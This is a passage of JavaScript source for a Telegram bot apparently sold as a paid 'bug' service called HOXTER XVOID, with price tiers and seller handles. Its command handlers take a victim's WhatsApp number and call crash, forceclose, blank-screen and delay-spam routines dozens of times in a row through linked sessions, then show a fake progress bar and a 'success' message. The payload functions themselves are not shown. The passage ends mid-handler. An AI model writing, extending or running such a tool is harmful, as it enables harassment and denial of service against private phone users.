┃<b>⋅𖤓⋅ /setcd - Set Cooldown</b>
┃<b>⋅𖤓⋅ /addprem - Add Premium</b>
┃<b>⋅𖤓⋅ /addadmin - add admin</b>
┃<b>⋅𖤓⋅ /deladmin - delete admin</b>
┃<b>⋅𖤓⋅ /delprem - Delete Premium</b>
┃<b>⋅𖤓⋅ /tiktok - Tiktok Downloader</b>
┃<b>⋅𖤓⋅ /tourl - To Url Image/Video</b>
┃<b>⋅𖤓⋅ /tourl2 - To Url Image</b>
┗━━━━━━━━━━━━━━━━━━⪼</blockquote>
`;
    replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
    }
    
    if (query.data === "harga") {
      caption = `
<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>
┗━━━━━━━━━━━━━━⪼
┏━━⪼ [ 𝗛𝗔𝗥𝗚𝗔 ⌂ 𝗦𝗖𝗥𝗜𝗣𝗧 ]
┃<b>⋅𖤓⋅ FULL UP : Rp10.000</b>
┃<b>⋅𖤓⋅ RESS SC : Rp20.000</b>
┃<b>⋅𖤓⋅ PARTNER SC : Rp30.000</b>
┃<b>⋅𖤓⋅ MODERATOR SC : Rp40.000</b>
┃<b>⋅𖤓⋅ OWNER SC : Rp50.000</b>
┃<b>⋅𖤓⋅ HOXTER STAFF : Rp70.000</b>
┃<b>⋅𖤓⋅ HOXTER ADMIN : Rp90.000</b>
┃<b>⋅𖤓⋅ DEV HOXTER : Rp130.000</b>
┃
┃<b>⋅𖤓⋅ BUY AKSES BISA KE @Fuckyatim</b>
┗━━━━━━━━━━━━━━━━━━⪼</blockquote>
`;
    replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
    }
    
    if (query.data === "tqto") {
      caption = `
<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>
┗━━━━━━━━━━━━━━⪼
┏━━⪼ [ 𝗧𝗤𝗧𝗢 ⌂ 𝗠𝗘𝗡𝗨 ]
┃<b>⋅𖤓⋅ 𝙏𝙪𝙖𝙣 𝙈𝙪𝙙𝙖 𝘼𝙖𝙧𝙤𝙣 [ Developer ]</b>
┃<b>⋅𖤓⋅╰➤ @Fuckyatim </b>
┃<b>⋅𖤓⋅╰➤ @Iyaetim </b>
@ridzzhalutrs
┗━━━━━━━━━━━━━━⪼
┏━━⪼ [ SUPPORT ]
┃<b>⋅𖤓⋅ @Ftmncloud12 ( Friend )</b>
┃<b>⋅𖤓⋅ @Angkasanyabobo ( Friend }</b>
┃<b>⋅𖤓⋅ @olucasidgaf ( Friend  )</b>
┃<b>⋅𖤓⋅ @FaiqOffc ( Friend )</b>
┃<b>⋅𖤓⋅ @AzkaOffcialReals (  Friend  )</b>
┃<b>⋅𖤓⋅ @Flavourhamzx ( Friend )</b>
┃<b>⋅𖤓⋅ @xoayanya ( Friend )</b>
┃<b>⋅𖤓⋅ @DragonSexte ( Friend )</b>
┃<b>⋅𖤓⋅ @zrillofficial ( Friend )</b>
┃<b>⋅𖤓⋅ @ripzzmbut ( Young Brother )</b>
┗━━━━━━━━━━━━━━━━━━━━━━━━⪼</blockquote>
`;
    replyMarkup = { inline_keyboard: [[{ text: "𝙱𝚊𝚌𝚔", callback_data: "back_to_main", style: "danger"}]] };
    }

    if (query.data === "back_to_main") {
      caption = ` 
<blockquote><tg-emoji emoji-id="4940998718838014973">💀</tg-emoji> 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 - 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎 <tg-emoji emoji-id="4987984647443973182">🪙</tg-emoji>
<tg-emoji emoji-id="5197429921634346862">☠️</tg-emoji> هذا البرنامج النصي خطير للغاية على المستخدمين والأهداف، لذا استخدمه بحكمة. <tg-emoji emoji-id="5348349394469022727">🚬</tg-emoji>

<tg-emoji emoji-id="5197531888452925507">🎁</tg-emoji> 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙎𝙄 - 𝙎𝘾𝙍𝙄𝙋𝙏  <tg-emoji emoji-id="5474197700087932281">🎁</tg-emoji>
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝚂𝙲𝚁𝙸𝙿𝚃 𝙽𝙰𝙼𝙴 : 𝙃𝙊𝙓𝙏𝙀𝙍 𝙓𝙑𝙊𝙄𝘿 
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝚅𝙴𝚁𝚂𝙸𝙾𝙽 : 2.0 BETA
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝙳𝙴𝚅𝙴𝙻𝙾𝙿𝙴𝚁 : @Fuckyatim
<tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> 𝙰𝙺𝚂𝙴𝚂 𝙼𝙾𝙳𝙴 : 𝙋𝙍𝙄𝙑𝘼𝙏𝙀 𝘼𝙆𝙎𝙀𝙎

<tg-emoji emoji-id="5411419730785369685">🎁</tg-emoji> شكرًا لاستخدامك هذا البرنامج النصي. استخدمه استخدامًا حسنًا، ولا تسيء استخدامه لأن ذلك قد يؤدي إلى عقوبات وفقًا للقانون. <tg-emoji emoji-id="5465206035729906349">🐈‍⬛</tg-emoji>
</blockquote>
`;
      replyMarkup = {
        inline_keyboard: [
        [
         { text: "𝗕𝗨𝗚 ⌂ 𝗠𝗢𝗗𝗘", callback_data: "bug_show", style: "danger", icon_custom_emoji_id: "5893257006323603821" },
         ],
         [
         { text: "✦•┈", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
          { text: "༺♱༻", callback_data: "tqto", style: "success", icon_custom_emoji_id: "4936468614967460670" },
          { text: "┈•✦", callback_data: "back_to_main", style: "primary", icon_custom_emoji_id: "4971994935172531040" },
         ],
         [
          { text: "𝗔𝗞𝗦𝗘𝗦 ⌂ 𝗠𝗘𝗡𝗨", callback_data: "akses", style: "primary", icon_custom_emoji_id: "5420323339723881652" },
          { text: "𝗛𝗔𝗥𝗚𝗔 ⌂ 𝗦𝗖𝗥𝗜𝗣𝗧", callback_data: "harga", style: "primary", icon_custom_emoji_id: "5409048419211682843" },
         ],
         [
          { text: "𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url: "https://t.me/Fuckyaetim", style: "danger", icon_custom_emoji_id: "6269255258212404947" },
          { text: "𝗗𝗘𝗩𝗘𝗟𝗢𝗣𝗘𝗥", url: "https://t.me/Fuckyatim", style: "danger", icon_custom_emoji_id: "6269048584386122161" },
         ]
        ]
      };
    }

    await bot.editMessageMedia(
      {
        type: "photo",
        media: randomImage,
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});
///funct lu taroh sini yang ampas

///and func

//=======CASE BUG=========//
bot.onText(/\/HoxterFc (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
      caption: `
\`\`\`
- HoxterFc
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- HoxterFc
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
    await JawaTimurIsBack(sock, target);
    await CrashJnvible(sock, target);
    await JawaTimurForcloseRelog(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- HoxterFc
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/HoxterCrash (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
      caption: `
\`\`\`
- HoxterCrash
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- HoxterCrash
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
    await CrashUi(sock, target);
    await CrashJnvible(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- HoxterCrash 
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/BlankHxt (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
      caption: `
\`\`\`
- BlankDvloids
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- BlankDvloids
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
   await JawaTimurBlankOld(sock, target)
   await BlankXDelay(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- BlankDvloids
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/HoxterVip (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
      caption: `
\`\`\`
- exitusvip
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- exitusvip
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
   await JawaTimurForcloseRelog(sock, target);
   await CrashUi(sock, target);
   await CrashJnvible(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- exitusvip
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/xspam (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
      caption: `
\`\`\`
- xspam
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- xspam
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
    await delayspam(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- xspam
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayvloid (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const randomImage = getRandomImage();
  const target = jid;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\` Извини, дорогая, у тебя нет возможности связаться с ним, потому что у него есть кто-то другой ( 🫀 ). \`\`\`
    buy akses ke owner di bawa inii !!!`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "Contact Owner ", url: "https://t.me/Fuckyatim" }],
      ]
    }
  });
}

const remainingTime = checkCooldown(msg.from.id);
if (remainingTime > 0) {
  return bot.sendMessage(chatId, `⏳ Tunggu ${Math.ceil(remainingTime / 60)} menit sebelum bisa pakai command ini lagi.`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, "https://ibb.co.com/39TLHrck", {
      caption: `
\`\`\`
- delayvloid
╰➤ Target : ${formattedNumber}
╰➤ Status : Mengirim bug...
╰➤ Progres : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const progressStages = [
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "ⵢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of progressStages) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
- delayvloid
╰➤ Target : ${formattedNumber}
╰➤ Status : Memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    for (let i = 0; i <= 50; i++) {   
   await DelayInvisBapakLowh(sock, target);
   const delay = ms => new Promise(res => setTimeout(1500));
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
- delayvloid
╰➤ Target : ${formattedNumber}
╰➤ Status : Sukses!
╰➤ Progres : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/delayinvis (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
